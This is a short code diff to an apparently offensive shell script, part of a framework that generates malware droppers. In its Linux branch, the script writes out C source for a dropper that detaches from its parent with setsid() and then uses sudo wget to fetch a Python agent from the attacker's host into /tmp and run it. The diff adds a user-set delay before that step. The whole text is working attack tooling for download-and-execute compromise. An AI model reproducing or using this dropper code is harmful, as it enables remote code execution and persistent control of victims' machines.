@@ -10326,6 +10326,10 @@ if [ "$SOSP" = "Windows" ]; then
 
 elif [ "$SOSP" = "Linux" ]; then
 
+      ## Set Agent (Client.py) execution delay time
+      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 10\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background." --entry) > /dev/null 2>&1
+      if [ -z "$delayTime" ]; then delayTime="10";fi
+
       ## BUILD DROPPER (to download/execute Client.py)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
       echo "#include<stdio.h>" > $Drop.c
@@ -10375,7 +10379,7 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "         allowing us to continue running the Client.py in ram even if parent process its terminated." >> $Drop.c
       echo "         */" >> $Drop.c
       echo "         setsid();" >> $Drop.c
-      echo "         system(\"cd /tmp && sudo /usr/bin/wget -qq http://$lhost/$Drop.py -O /tmp/$Drop.py && python3 $Drop.py\");" >> $Drop.c
+      echo "         sleep($delayTime);system(\"cd /tmp && sudo /usr/bin/wget -qq http://$lhost/$Drop.py -O /tmp/$Drop.py && python3 $Drop.py\");" >> $Drop.c
       echo "      } return 0;" >> $Drop.c
       echo "}" >> $Drop.c
 
